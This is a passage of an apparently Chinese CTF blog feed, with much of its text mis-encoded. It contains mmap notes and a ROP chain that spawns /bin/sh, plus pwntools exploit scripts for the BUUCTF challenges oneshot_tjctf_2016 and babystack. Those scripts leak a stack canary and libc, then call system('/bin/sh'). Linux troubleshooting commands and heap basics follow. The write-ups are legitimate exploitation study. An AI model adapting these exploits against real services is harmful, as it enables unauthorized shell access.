id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>å‚æ•°startï¼šæŒ‡å‘æ¬²æ˜ å°„çš„å†…å­˜èµ·å§‹åœ°å€ï¼Œé€šå¸¸è®¾ä¸º NULLï¼Œä»£è¡¨è®©ç³»ç»Ÿè‡ªåŠ¨é€‰å®šåœ°å€ï¼Œæ˜ å°„æˆåŠŸåè¿”å›è¯¥åœ°å€ã€‚</p><p>å‚æ•°lengthï¼šä»£è¡¨å°†æ–‡ä»¶ä¸­å¤šå¤§çš„éƒ¨åˆ†æ˜ å°„åˆ°å†…å­˜ã€‚</p><p>å‚æ•°protï¼šæ˜ å°„åŒºåŸŸçš„ä¿æŠ¤æ–¹å¼ã€‚å¯ä»¥ä¸ºä»¥ä¸‹å‡ ç§æ–¹å¼çš„ç»„åˆï¼š<br>PROT_EXEC       æ˜ å°„åŒºåŸŸå¯è¢«æ‰§è¡Œ<br>PROT_READ       æ˜ å°„åŒºåŸŸå¯è¢«è¯»å–<br>PROT_WRITE     æ˜ å°„åŒºåŸŸå¯è¢«å†™å…¥<br>PROT_NONE      æ˜ å°„åŒºåŸŸä¸èƒ½å­˜å–</p><p>å‚æ•°flagsï¼šå½±å“æ˜ å°„åŒºåŸŸçš„å„ç§ç‰¹æ€§ã€‚åœ¨è°ƒç”¨mmap()æ—¶å¿…é¡»è¦æŒ‡å®šMAP_SHARED æˆ–MAP_PRIVATEã€‚<br>MAP_FIXED                å¦‚æœå‚æ•°startæ‰€æŒ‡çš„åœ°å€æ— æ³•æˆåŠŸå»ºç«‹æ˜ å°„æ—¶ï¼Œåˆ™æ”¾å¼ƒæ˜ å°„ï¼Œä¸å¯¹åœ°å€åšä¿®æ­£ã€‚é€šå¸¸ä¸é¼“åŠ±ç”¨æ­¤æ——æ ‡ã€‚<br>MAP_SHARED          å¯¹æ˜ å°„åŒºåŸŸçš„å†™å…¥æ•°æ®ä¼šå¤åˆ¶å›æ–‡ä»¶å†…ï¼Œè€Œä¸”å…è®¸å…¶ä»–æ˜ å°„è¯¥æ–‡ä»¶çš„è¿›ç¨‹å…±äº«ã€‚<br>MAP_PRIVATE            å¯¹æ˜ å°„åŒºåŸŸçš„å†™å…¥æ“ä½œä¼šäº§ç”Ÿä¸€ä¸ªæ˜ å°„æ–‡ä»¶çš„å¤åˆ¶ï¼Œå³ç§äººçš„â€œå†™å…¥æ—¶å¤åˆ¶â€ï¼ˆcopy on writeï¼‰å¯¹æ­¤åŒºåŸŸä½œçš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå†™å›åŸæ¥çš„æ–‡ä»¶å†…å®¹ã€‚<br>MAP_ANONYMOUS  å»ºç«‹åŒ¿åæ˜ å°„ã€‚æ­¤æ—¶ä¼šå¿½ç•¥å‚æ•°fdï¼Œä¸æ¶‰åŠæ–‡ä»¶ï¼Œè€Œä¸”æ˜ å°„åŒºåŸŸæ— æ³•å’Œå…¶ä»–è¿›ç¨‹å…±äº«ã€‚<br>MAP_DENYWRITE   åªå…è®¸å¯¹æ˜ å°„åŒºåŸŸçš„å†™å…¥æ“ä½œï¼Œå…¶ä»–å¯¹æ–‡ä»¶ç›´æ¥å†™å…¥çš„æ“ä½œå°†ä¼šè¢«æ‹’ç»ã€‚<br>MAP_LOCKED          å°†æ˜ å°„åŒºåŸŸé”å®šä½ï¼Œè¿™è¡¨ç¤ºè¯¥åŒºåŸŸä¸ä¼šè¢«ç½®æ¢ï¼ˆswapï¼‰ã€‚</p><p>å‚æ•°fdï¼šè¦æ˜ å°„åˆ°å†…å­˜ä¸­çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœä½¿ç”¨åŒ¿åå†…å­˜æ˜ å°„æ—¶ï¼Œå³flagsä¸­è®¾ç½®äº†MAP_ANONYMOUSï¼Œfdè®¾ä¸º-1ã€‚æœ‰äº›ç³»ç»Ÿä¸æ”¯æŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œåˆ™å¯ä»¥ä½¿ç”¨fopenæ‰“å¼€/dev/zeroæ–‡ä»¶ï¼Œç„¶åå¯¹è¯¥æ–‡ä»¶è¿›è¡Œæ˜ å°„ï¼Œå¯ä»¥åŒæ ·è¾¾åˆ°åŒ¿åå†…å­˜æ˜ å°„çš„æ•ˆæœã€‚</p><p>å‚æ•°offsetï¼šæ–‡ä»¶æ˜ å°„çš„åç§»é‡ï¼Œé€šå¸¸è®¾ç½®ä¸º0ï¼Œä»£è¡¨ä»æ–‡ä»¶æœ€å‰æ–¹å¼€å§‹å¯¹åº”ï¼Œoffsetå¿…é¡»æ˜¯åˆ†é¡µå¤§å°çš„æ•´æ•°å€ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œä¸ºå¹¸ç¦å†™æ­Œã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/yzy1103203312/article/details/78286360">https://blog.csdn.net/yzy1103203312/article/details/78286360</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br>rop = <span class="hljs-string">&#x27;&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += p(<span class="hljs-number">0x0000000b</span>)<br>rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret; </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>oneshot_tjctf_2016</title>
    <link href="/2020/02/05/oneshot_tjctf_2016/"/>
    <url>/2020/02/05/oneshot_tjctf_2016/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020208419.png" class="" title="image-20200205020208419"><img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020146218.png" class="" title="image-20200205020146218"><p>*v4ï¼Œè¦ç”¨<code>str(elf.got[&#39;__libc_start_main&#39;])</code></p><p>æ¥å—è¦ç”¨<code>int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;</span>)<br>    payload = <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    pause()<br>    sh.sendline(payload)<br>    sh.recvuntil(<span class="hljs-string">&quot;0x0000&quot;</span>)<br>    __libc_start_main = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    one_gadget = <span class="hljs-number">0xf1147</span> <br>    payload = <span class="hljs-built_in">str</span>( libc  + one_gadget)<br>    sh.sendline(payload)<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29303</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>leak_canary-others_babystack</title>
    <link href="/2020/02/04/leak_canary-others_babystack/"/>
    <url>/2020/02/04/leak_canary-others_babystack/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/04/leak_canary-others_babystack/image-20200204230127839.png" class="" title="image-20200204230127839"><p>Full RELRO GOTè¡¨åªè¯»</p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230141663.png" class="" title="image-20200204230141663"><p>sç”³è¯·çš„æ˜¯0x80ï¼Œä½†è¯»å…¥0x100ã€‚å¹¶ä¸”canaryåœ¨stack -0x8çš„åœ°æ–¹</p><p>å…ˆæ³„éœ²canaryï¼Œputså‡½æ•°åœ¨è¾“å‡ºæ—¶ï¼Œåªæœ‰é‡åˆ°\x00æ‰ä¼šç»“æŸï¼Œç”¨\nè¦†ç›–canaryçš„ç¬¬ä¸€å­—èŠ‚\x00ï¼Œä»è€Œè·å¾—canary</p><p><code>payload = cyclic(0x90-0x8)</code></p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230829836.png" class="" title="image-20200204230829836"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br></code></pre></td></tr></table></figure><p>ç„¶åæ„é€ payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>():</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>store(payload)<br>printf()<br>sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>payload += p64(canary)<br>payload += cyclic(<span class="hljs-number">0x8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(main)<br>store(payload)<br>quit()<br></code></pre></td></tr></table></figure><p><strong>å¿…é¡»è¦quitäº†æ‰ä¼šç»§ç»­è¿è¡Œåˆ°æˆ‘ä»¬çš„æº¢å‡ºéƒ¨åˆ†</strong></p><p>åé¢å°±æ˜¯å¸¸è§„äº†</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        <span class="hljs-comment">#lib = ELF(&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;)</span><br>    pop_rdi_ret = <span class="hljs-number">0x0400a93</span><br>    main = <span class="hljs-number">0x400908</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">payload</span>):</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>        sh.sendline(payload)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>():</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>    store(payload)<br>    printf()<br>    sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>    canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>    log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>) <br>    payload += p64(canary) <br>    payload += cyclic(<span class="hljs-number">0x8</span>)<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p64(main)<br>    store(payload)<br>    quit()<br>    <br>    __libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    <br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>    payload += p64(canary)<br>    payload += cyclic(<span class="hljs-number">0x8</span>)<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(binsh)<br>    payload += p64(system)<br>    store(payload)<br>    quit()<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25459</span>,<span class="hljs-number">1</span> )<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linuxå¸¸è§é—®é¢˜è§£å†³æ–¹æ³•</title>
    <link href="/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -A | grep apt<br>sudo kill -9 processnumber<br><br>sudo rm /var/lib/dpkg/lock<br>sudo rm /var/lib/dpkg/lock-frontend<br></code></pre></td></tr></table></figure><p>E: Could not get lock /var/cache/apt/archives/lock - open (11: Resource temporarily unavailable) </p><p>E: Unable to lock directory /var/cache/apt/archives/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo killall apt-get<br><br>sudo rm /var/lib/apt/lists/lock<br>sudo rm /var/cache/apt/archives/lock<br>sudo rm /var/lib/dpkg/lock<br></code></pre></td></tr></table></figure><p>Ubuntu-çªç„¶æ— æ³•è”ç½‘ï¼Œä¸”å³ä¸Šæ–¹æ²¡æœ‰ç½‘ç»œæ ‡å¿—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service network-manager stop<br>sudo rm /var/lib/NetworkManager/NetworkManager.state <br>sudo service network-manager start<br></code></pre></td></tr></table></figure><p>æ¥è‡ª <a href="http://yoursite.com/">å’²å¤œå—æ¢¦â€™s åšå®¢</a>ï¼Œ<a href="[https://196011564.github.io/2018/12/23/Ubuntu-%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/](https://196011564.github.io/2018/12/23/Ubuntu-çªç„¶æ— æ³•è”ç½‘/)">åŸåœ°å€</a></p><p>ä¿®æ”¹æ—¶åŒº</p><p><a href="https://juejin.cn/post/6844904163713761294">https://juejin.cn/post/6844904163713761294</a></p>]]></content>
    
    
    <categories>
      
      <category>Linuxä½¿ç”¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux é—®é¢˜è§£å†³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN ç¯å¢ƒæ­å»ºæ¸…å•</title>
    <link href="/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/"/>
    <url>/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><p>ubuntu18ã€16</p><p>pwntools </p><p>edb è°ƒè¯•æ ˆå¥½</p><p>vim</p><p>libcsearcher</p><p>pwndbg è°ƒè¯•å †å¥½</p><p>seccomp-tools æŸ¥çœ‹seccomp</p><p>proxychains4 apt getçš„å¿«</p><h2 id="WIN-MAC"><a href="#WIN-MAC" class="headerlink" title="WIN/MAC"></a>WIN/MAC</h2><p>IDA åæ±‡ç¼–</p><p>die æŸ¥çœ‹32/64 å’Œå£³ç­‰</p><p><a href="http://mrbelieve.tech/2019/12/23/Pwnå¸¸ç”¨æŒ‡ä»¤/">ä¸€äº›å¸¸ç”¨æŒ‡ä»¤</a></p><p><a href="[https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#0x05-get-started-3dsctf-2016](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwnåˆ·é¢˜ä¹‹æ—…-(1)/#0x05-get-started-3dsctf-2016">å¯ä¾›å‚è€ƒexp from å—æ¢¦</a></p>]]></content>
    
    
    <categories>
      
      <category>PWNç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å †çš„åŸºç¡€çŸ¥è¯†</title>
    <link href="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul><li>ä¿®æ”¹æŸä¸ªå‡½æ•°çš„gotè¡¨ ä¸º system çš„åœ°å€,ç„¶åå‚æ•°å‡†å¤‡ä¸ºbinsh å°±å¯ä»¥</li><li>ä¿®æ”¹freeå‡½æ•°ä¸ºputså‡½æ•°,ç„¶åæŸä¸ªå †é‡Œå‚æ•°å‡†å¤‡ä¸ºæŸä¸ªå‡½æ•°çš„gotè¡¨åœ°å€ å°±å¯ä»¥æ³„éœ²åœ°å€äº†</li><li>one_gadget</li></ul><p>æ¥æºï¼š<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></p><p><strong>åœ¨ 64 ä½ç¨‹åºä¸­ï¼š</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span><br></code></pre></td></tr></table></figure><p>ç”³è¯·åˆ°çš„å †å—æ€»å¤§å°ä¸º 16 + 8 + 8 + 1 = 0x21</p><p>1.ç¬¬ä¸€ä¸ª 16 å­—èŠ‚æ˜¯<strong>ç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¦‚æœæƒ³è¦ç”³è¯·çš„å†…å­˜å°äºç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜çš„è¯ï¼Œå°±ä¼šæŒ‰ç…§æœ€å°çš„å†…å­˜æ¥åˆ†é…ã€‚</p><ul><li>åœ¨ 64 ä½ç³»ç»Ÿä¸­è¿™ä¸ªå€¼æ˜¯ 16 ä¸ªå­—èŠ‚ï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸­æ˜¯ 8 ä¸ªå­—èŠ‚</li><li>ä¾‹å¦‚ï¼Œå¦‚æœä»£ç ä¸­æ˜¯ malloc(0) çš„è¯ï¼Œ<strong>å †ç®¡ç†å™¨ä¹Ÿä¼šåˆ†é…æœ€å°å†…å­˜ç©ºé—´ç»™ä½ </strong></li></ul><p>2.ç¬¬äºŒä¸ª 8 å­—èŠ‚æ˜¯ pre size å­—æ®µçš„å¤§å°ï¼ˆ32 ä½çš„ä¸º 4 å­—èŠ‚ï¼‰<br>3.ç¬¬ä¸‰ä¸ª 8 å­—èŠ‚ä¸º size å­—æ®µçš„å¤§å°ï¼ˆ32 ä½çš„ä¸º 4 å­—èŠ‚ï¼‰<br>4.æœ€åä¸€ä¸ª 1 å­—èŠ‚æ˜¯ <strong>PREV_INUSE çš„å€¼ï¼Œåªæœ‰ 0 æˆ– 1ä¸¤ä¸ªå€¼</strong></p><hr><p>1.pre size å­—æ®µã€‚<strong>åªæœ‰åœ¨å‰é¢ä¸€ä¸ªå †å—æ˜¯ç©ºé—²çš„æ—¶å€™æ‰æœ‰æŒ‡</strong>ï¼Œç”¨æ¥æŒ‡ç¤ºå‰ä¸€ä¸ªå †å—çš„å¤§å°ã€‚å‰é¢ä¸€ä¸ªå †å—åœ¨ä½¿ç”¨æ—¶ï¼Œä»–çš„å€¼å§‹ç»ˆä¸º 0<br>2.size å­—æ®µã€‚æ˜¯ç”¨æ¥æŒ‡ç¤ºå½“å‰å †å—çš„å¤§å°çš„ï¼ˆå¤´éƒ¨åŠ ä¸Š user data 